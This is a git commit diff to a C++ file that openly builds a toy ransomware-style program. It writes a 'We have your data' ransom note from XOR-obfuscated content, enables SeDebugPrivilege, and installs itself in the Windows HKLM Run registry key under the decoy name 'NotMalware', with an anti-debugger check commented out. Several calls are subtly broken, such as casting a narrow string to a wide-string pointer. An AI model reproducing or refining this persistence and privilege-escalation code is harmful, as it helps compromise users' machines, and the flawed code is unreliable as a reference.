ecdcaa1785d8fe956eb09b4ed1f693b7fc44c24d
matt <46659541+HuloM@users.noreply.github.com>
2026-02-22 23:04:23 -0800

    update

--- main.cpp
+++ main.cpp
@@ -1,12 +1,15 @@
 #include <iostream>
 #include <fstream>
+#include <debugapi.h>
+#include <windows.h>
+#include <libloaderapi.h>
 using namespace std;
 
 
-string Xor_OP(char * str) {
+string Xor_OP(const char * str) {
     const char a[5] = {'C', 'S', '5', '7', '9'};
 
-    string rtn_s = "";
+    string rtn_s;
 
     for (int i = 0; i < 5; i++) {
         rtn_s += a[i] ^ str[i];
@@ -30,19 +33,85 @@ int malware() {
         Xor_s.append(Xor_OP(s.data())).append("\n");
     };
 
-    cout << s;
-
-
-    cout << Xor_s;
-
     ofstream MyFile("MyFile.txt");
     MyFile << "We have your data\n" + Xor_s;
     MyFile.close();
     return 0;
 };
 
-int main() {
+string get_current_WD() {
+    TCHAR buffer[MAX_PATH] = { 0 };
+    GetModuleFileNameA(nullptr, buffer, MAX_PATH);
+    return &*buffer;
+}
 
-    malware();
+bool EnableSeDebugPrivilege()
+{
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+
+    // Open the process token
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return false;
+
+    // Look up the LUID for SeDebugPrivilege
+    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
+    {
+        CloseHandle(hToken);
+        return false;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    // Apply the privilege adjustment
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
+    {
+        CloseHandle(hToken);
+        return false;
+    }
+
+    // AdjustTokenPrivileges can succeed but still fail to set the privilege
+    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+    {
+        CloseHandle(hToken);
+        return false;
+    }
+
+    CloseHandle(hToken);
+    return true;
+}
+
+int regedit(string filename) {
+    HKEY hKey;
+    if (int res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey); res == ERROR_SUCCESS) {
+
+        if (RegSetValueExW(hKey, reinterpret_cast<LPCWSTR>("NotMalware"), 0, REG_SZ, reinterpret_cast<const BYTE *>(&filename), (filename.size() + 1)))
+        {
+            cout<<"Key Not Updated"<<endl;
+            RegCloseKey(hKey);
+            return 0;
+        }
+
+        RegCloseKey(hKey);
+        cout<<"Key Updated"<<endl;
+        return 1;
+    }
     return 0;
+}
+
+
+
+int main() {
+    //if (!IsDebuggerPresent()) {
+        if (EnableSeDebugPrivilege())
+            if (const string current_WD = get_current_WD(); regedit(current_WD)) {
+                malware();
+                return 0;
+            }
+        return 1;
+    //}
+    return 1;
 }
